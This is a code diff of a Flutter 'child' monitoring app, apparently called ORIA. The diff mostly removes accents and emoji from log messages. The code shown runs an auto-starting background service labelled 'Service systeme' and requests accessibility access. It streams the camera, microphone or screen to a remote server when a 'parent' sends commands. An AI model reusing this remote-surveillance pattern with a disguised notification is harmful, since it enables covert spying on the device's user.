@@ -10,7 +10,6 @@ import 'dart:ui';
 
 const String SERVER_URL = 'https://oria-server-tzc1.onrender.com';
 
-// ✅ Logs visibles à l'écran
 final List<String> _visibleLogs = [];
 void addLog(String msg) {
   final line = '${DateTime.now().toString().substring(11, 19)} $msg';
@@ -21,7 +20,7 @@ void addLog(String msg) {
 
 void main() async {
   WidgetsFlutterBinding.ensureInitialized();
-  addLog('App démarrée');
+  addLog('App demarree');
 
   await [
     Permission.camera,
@@ -30,7 +29,7 @@ void main() async {
     Permission.notification,
     Permission.storage,
   ].request();
-  addLog('Permissions demandées');
+  addLog('Permissions demandees');
 
   final prefs = await SharedPreferences.getInstance();
   final accessibilityEnabled = prefs.getBool('accessibility_enabled') ?? false;
@@ -39,7 +38,7 @@ void main() async {
     runApp(const EnableAccessibilityScreen());
     return;
   }
-  addLog('Accessibilité: ACTIVÉE');
+  addLog('Accessibilite: ACTIVEE');
 
   await initializeService();
   runApp(const OriaChildApp());
@@ -53,13 +52,13 @@ Future<void> initializeService() async {
       autoStart: true,
       isForegroundMode: true,
       foregroundServiceNotificationId: 888,
-      initialNotificationTitle: 'Service système',
+      initialNotificationTitle: 'Service systeme',
       initialNotificationContent: 'Actif',
     ),
     iosConfiguration: IosConfiguration(autoStart: true, onForeground: onStart),
   );
   await service.startService();
-  addLog('Service arrière-plan démarré');
+  addLog('Service arriere-plan demarre');
 }
 
 @pragma('vm:entry-point')
@@ -84,48 +83,48 @@ void onStart(ServiceInstance instance) async {
     });
 
     socket!.on('connect', (_) {
-      addLog('✅ Connecté au serveur');
+      addLog('Connecte au serveur');
       socket!.emit('register_child', {'deviceId': deviceId, 'deviceName': deviceName});
-      addLog('📤 Enregistré: $deviceName');
+      addLog('Enregistre: $deviceName');
     });
 
     socket!.on('execute_command', (data) async {
       final action = data['action'];
-      addLog('📡 COMMANDE REÇUE: $action');
+      addLog('COMMANDE RECUE: $action');
 
       try {
         if (action == 'start_camera') {
           await streamService?.stop();
           streamService = StreamService(socket!, 'parent-main');
           await streamService!.startCamera();
-          addLog('✅ CAMÉRA DÉMARRÉE');
+          addLog('CAMERA DEMARREE');
         } else if (action == 'start_mic') {
           await streamService?.stop();
           streamService = StreamService(socket!, 'parent-main');
           await streamService!.startMic();
-          addLog('✅ MICRO DÉMARRÉ');
+          addLog('MICRO DEMARRE');
         } else if (action == 'start_screen') {
           await streamService?.stop();
           streamService = StreamService(socket!, 'parent-main');
           await streamService!.startScreen();
-          addLog('✅ ÉCRAN DÉMARRÉ');
+          addLog('ECRAN DEMARRE');
         } else if (action == 'stop_stream') {
           await streamService?.stop();
           streamService = null;
-          addLog('🛑 STREAM ARRÊTÉ');
+          addLog('STREAM ARRETE');
         }
       } catch (e) {
-        addLog('❌ ERREUR: $e');
+        addLog('ERREUR: $e');
       }
     });
 
     socket!.on('signal', (msg) {
-      addLog('🔄 Signal reçu: ${msg['type']}');
+      addLog('Signal recu: ${msg['type']}');
       streamService?.handleSignal(msg);
     });
 
-    socket!.on('connect_error', (_) => addLog('⏳ Reconnexion...'));
-    socket!.on('disconnect', (_) => addLog('❌ Déconnecté'));
+    socket!.on('connect_error', (_) => addLog('Reconnexion...'));
+    socket!.on('disconnect', (_) => addLog('Deconnecte'));
   }
   connect();
 }
@@ -148,7 +147,7 @@ class EnableAccessibilityScreen extends StatelessWidget {
                 const SizedBox(height: 24),
                 const Text('Activation requise', style: TextStyle(color: Colors.white, fontSize: 24, fontWeight: FontWeight.bold)),
                 const SizedBox(height: 16),
-                const Text('ORIA a besoin du service d\'accessibilité.\n\n1. Cliquez ci-dessous\n2. Activez "ORIA"\n3. Revenez ici', textAlign: TextAlign.center, style: TextStyle(color: Colors.grey, fontSize: 14)),
+                const Text('ORIA a besoin du service accessibilite.\n\n1. Cliquez ci-dessous\n2. Activez ORIA\n3. Revenez ici', textAlign: TextAlign.center, style: TextStyle(color: Colors.grey, fontSize: 14)),
                 const SizedBox(height: 32),
                 FilledButton.icon(
                   onPressed: () async {
@@ -156,7 +155,7 @@ class EnableAccessibilityScreen extends StatelessWidget {
                     await intent.launch();
                   },
                   icon: const Icon(Icons.settings_accessibility),
-                  label: const Text('OUVRIR PARAMÈTRES'),
+                  label: const Text('OUVRIR PARAMETRES'),
                   style: FilledButton.styleFrom(minimumSize: const Size(double.infinity, 50)),
                 ),
                 const SizedBox(height: 16),
@@ -167,7 +166,7 @@ class EnableAccessibilityScreen extends StatelessWidget {
                     await initializeService();
                     runApp(const OriaChildApp());
                   },
-                  child: const Text('Déjà activé → Continuer', style: TextStyle(color: Colors.grey)),
+                  child: const Text('Deja active > Continuer', style: TextStyle(color: Colors.grey)),
                 ),
               ],
             ),
@@ -204,8 +203,8 @@ class _OriaChildAppState extends State<OriaChildApp> {
                       child: Column(
                         crossAxisAlignment: CrossAxisAlignment.start,
                         children: [
-                          Text("ORIA Activé", style: TextStyle(color: Colors.grey, fontSize: 16)),
-                          Text("Service en arrière-plan actif.", style: TextStyle(color: Colors.grey, fontSize: 11)),
+                          Text("ORIA Active", style: TextStyle(color: Colors.grey, fontSize: 16)),
+                          Text("Service en arriere-plan actif.", style: TextStyle(color: Colors.grey, fontSize: 11)),
                         ],
                       ),
                     ),
@@ -213,7 +212,6 @@ class _OriaChildAppState extends State<OriaChildApp> {
                 ),
               ),
               const Divider(color: Colors.grey),
-              // ✅ PANNEAU DE LOGS VISIBLES
               Expanded(
                 child: ListView.builder(
                   padding: const EdgeInsets.all(12),
@@ -223,9 +221,9 @@ class _OriaChildAppState extends State<OriaChildApp> {
                     child: Text(
                       _visibleLogs[i],
                       style: TextStyle(
-                        color: _visibleLogs[i].contains('❌') ? Colors.red :
-                               _visibleLogs[i].contains('✅') ? Colors.green :
-                               _visibleLogs[i].contains('📡') ? Colors.yellow :
+                        color: _visibleLogs[i].contains('ERREUR') ? Colors.red :
+                               _visibleLogs[i].contains('CAMERA') || _visibleLogs[i].contains('MICRO') || _visibleLogs[i].contains('ECRAN') ? Colors.green :
+                               _visibleLogs[i].contains('COMMANDE') ? Colors.yellow :
                                Colors.grey[400],
                         fontSize: 12,
                         fontFamily: 'monospace',
